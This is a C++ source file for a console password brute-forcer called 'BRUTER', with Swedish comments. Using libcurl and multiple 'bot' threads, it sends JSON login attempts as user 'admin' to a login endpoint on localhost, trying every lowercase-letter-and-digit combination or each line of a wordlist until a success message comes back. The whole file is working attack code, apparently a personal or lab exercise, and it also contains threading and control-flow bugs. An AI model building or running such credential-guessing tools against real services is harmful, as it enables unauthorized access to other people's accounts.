#define NOMINMAX
#include <iostream>
#include <string>
#include <curl/curl.h>
#include <cmath>
#include <thread>
#include <chrono>
#include <fstream>
#include <limits>
#include <vector>
#include <csignal>
#include <future>

using namespace std;

int passwordMinLength;
int passwordMaxLength;
string allowedChars = "abcdefghijklmnopqrstuvwxyz0123456789";
double passwordTryProgress;
bool exitprogram = false;
bool runTimer = false;
int totalPasswords;


void mainMenu();
void bruterAsciiArt();
static size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp);
string sendAndReciveHTTP(string username, string password);
void doBruteForceToMaxLength(int maxLength);
bool gen(string allowedChars, int length, string password, double* pointer);
void progressTimer();
void allCombinationsMenu();
void wordlistMenu();
int getTotalPasswords();
void dividePasswords(string password, int bot);
void createBots(int amountBots);
bool dynamicPasswordGen(int length, string password, int bot);




class Bot
{
    public:
        static bool passwordFound;
        static int amountBots;
        static const int maximumPasswordsInMemory = 1000000;
        vector<string> wordlist;
        
        void brute()
        {
            for (string pass : wordlist)
            {

                string response = sendAndReciveHTTP("admin", pass);
                passwordTryProgress += 1;

                if (response == "{\"success\":true,\"message\":\"Inloggad som admin\"}")
                {
                    cout << "\nThe correct password is: " << pass << "\n";
                    runTimer = false;
                    passwordFound = true;
                    break;
                }
            }
        }
};

bool Bot::passwordFound = false;
int Bot::amountBots = -1;
Bot* bots = nullptr;
vector<thread> allBotThreads;

int main()
{
  /* wordlistMenu();*/

    mainMenu();

    return 0;
}

void mainMenu()
{
    /*Bot::passwordFound = false;*/

    while (!exitprogram)
    {
        bruterAsciiArt();

        int menuOption;

        cout << "\033[0m" "Select from the menu:\n\n";
        cout << "1) All combinations\n";
        cout << "2) Personal wordlist\n";
        cout << "3) Wordlist\n";
        cout << "4) History\n";
        cout << "9) Exit\n\n";
        cout << "> ";

        cin >> menuOption;
        std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');

        switch (menuOption)
        {
        case 1:
            allCombinationsMenu();
            break;
        case 2:
            break;
        case 3:
            wordlistMenu();
        case 9:
            exitprogram = true;
            break;
        default:
            cout << " Invalid input\n";
        }
    }
    

}

static size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp)
{
    ((string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

string sendAndReciveHTTP(string username, string password)
{
    CURL* curl;
    CURLcode res;
    string response;

    // JSON payload
    string json_payload = "{\"username\":\"" + username + "\", \"password\":\"" + password + "\"}";

    string output = "fail";

    curl = curl_easy_init();
    if (curl)
    {
        // Sätt URL
        curl_easy_setopt(curl, CURLOPT_URL, "http://localhost:3000/login");

        // Sätt till POST
        curl_easy_setopt(curl, CURLOPT_POST, 1L);  

        // Sätt JSON payload
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json_payload.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, json_payload.length());

        // Sätt headers (inklusive Content-Type)
        struct curl_slist* headers = NULL;
        headers = curl_slist_append(headers, "Content-Type: application/json");
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);

        // Sätt callback-funktion
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response);

        // Utför förfrågan
        res = curl_easy_perform(curl);

        // Kontrollera för fel
        if (res != CURLE_OK)
        {
            
        }
        else
        {
            output = response;
        }

        // Städa upp headers
        curl_slist_free_all(headers);

        // Städa upp curl
        curl_easy_cleanup(curl);
    }
    return output;
}

void progressTimer()
{
    runTimer = true;
    int total = getTotalPasswords();


    while (runTimer)
    {
        this_thread::sleep_for(chrono::seconds(5));

        double percentage = (passwordTryProgress / total) * 100.0;
        cout << "[Progress] " << percentage << "% Done" << endl;
    }
}

//bool gen(int length, string password)
//{
//    for (char character : allowedChars)
//    {
//        if (password.length() == length - 1)
//        {
//            string response = sendAndReciveHTTP("admin", password + character);
//
//            passwordTryProgress += 1;
//
//            if (response == "{\"success\":true,\"message\":\"Inloggad som admin\"}")
//            {
//                cout << "\nThe correct password is: " << password << character << "\n";
//                runTimer = false;
//                return false;
//            }
//        }
//        else
//        {
//            if (gen(length, password + character) == false)
//            {
//                return false;
//            }
//        }
//    }
//    return true;
//}

void dividePasswords(string password, int bot)
{
    bots[bot].wordlist.push_back(password);
}

void startAllBrute()
{
    bool result = false;
    allBotThreads.reserve(Bot::amountBots);

    for (int i = 0; i < Bot::amountBots; i++)
    {
        allBotThreads.emplace_back(&Bot::brute, &bots[i]);
    }
}

void clearAllWordlists()
{
    for (int i = 0; i < Bot::amountBots; i++)
    {
        bots[i].wordlist.clear();
    }
}

int totalCurrentWordlistSize()
{
    int output = 0;

    for (int i = 0; i < Bot::amountBots; i++)
    {
        output += bots[i].wordlist.size();
    }

    return output;
}

void exitThreads()
{
    for (thread& thread : allBotThreads)
    {
        if (thread.joinable())
        {
            thread.join();
        }
    }
}

bool dynamicPasswordGen(int length, string password, int bot)
{
    for (char character : allowedChars)
    {
        if (password.length() == length - 1)
        {
            if (Bot::maximumPasswordsInMemory == totalCurrentWordlistSize() || totalCurrentWordlistSize() == totalPasswords) // Kör ej GetTotalPasswords som metod här sen för de slösar tid
            {
                future<void> result = async(launch::async, startAllBrute);

                if (Bot::passwordFound == true)
                {
                    return true;
                }

                clearAllWordlists();
            }
            else
            {
                dividePasswords(password + character, bot);
            }

            if (bot < Bot::amountBots - 1)
            {
                bot++;
            }
            else
            {
                bot = 0;
            }
        }
        else
        {
            if (dynamicPasswordGen(length, password + character, bot))
            {
                return true;
            }
        }
    }
    return false;
}

void createBots(int amountBots)
{
    delete[] bots;
    bots = new Bot[amountBots];
}

void doBruteForceToMaxLength()
{
    passwordTryProgress = 0;
    bool passwordNotFound = true;


    thread timerThread(progressTimer);


    for (int i = passwordMinLength; i <= passwordMaxLength; i++)
    {
        if (dynamicPasswordGen(i, "", 0) == true)
        {
            passwordNotFound = false;
            break;
        }
    }

  /*  exitThreads();*/

    runTimer = false;

    if (passwordNotFound)
    {
        cout << "Password not found" << endl;
        cout << "Press enter to continue" << endl;
    }
    
    if (timerThread.joinable())
    {
        timerThread.join();
    }
}

void allCombinationsMenu()
{
    bool validInput = false;
    string stringBots;

    while (!validInput)
    {
        cout << '\n' << "Enter password minimum length: ";
        cin >> passwordMinLength;
        cout << "Enter password maximum length: ";
        cin >> passwordMaxLength;
        cout << "How many bots do you want (1-500): ";
        cin >> stringBots;

        Bot::amountBots = stoi(stringBots);
        totalPasswords = getTotalPasswords();

        createBots(stoi(stringBots));

        if (passwordMinLength > passwordMaxLength)
        {
            cout << "Invalid input, minimum length must be equal or less then maximum length";
        }
        else
        {
            validInput = true;
        }
    }
    
    doBruteForceToMaxLength();
}

void wordlistMenu()
{
    string path;
    string passwordRow;

    cout << "Enter wordlist file path: ";
    getline(cin, path);


    ifstream in(path);        // öppna filen
    if (!in)
    {                    // kolla att den öppnades
        std::cerr << "Could not open the file: " << path << "\n";
        return;
    }

    while (getline(in, passwordRow)) 
    {
        if (passwordRow.empty())
            continue;
        
        string response = sendAndReciveHTTP("admin", passwordRow);

        if (response == "{\"success\":true,\"message\":\"Inloggad som admin\"}")
        {
            cout << "The correct password is: " << passwordRow;
            exit(0);
        }
    }
}


int getTotalPasswords()
{
    int total = 0;
    for (int i = passwordMinLength; i <= passwordMaxLength; i++)
    {
        total += pow(allowedChars.length(), i);
    }

    return total;
}

void bruterAsciiArt()
{
    cout << "\033[1;31m" R"(
      ____  _____  _    _ _______ ______ _____  
     |  _ \|  __ \| |  | |__   __|  ____|  __ \ 
     | |_) | |__) | |  | |  | |  | |__  | |__) |
     |  _ <|  _  /| |  | |  | |  |  __| |  _  / 
     | |_) | | \ \| |__| |  | |  | |____| | \ \ 
     |____/|_|  \_\\____/   |_|  |______|_|  \_\
)" << '\n';
    cout << "\033[93m" "    - Made by BuzDee" << "\n\n\n";
       
}







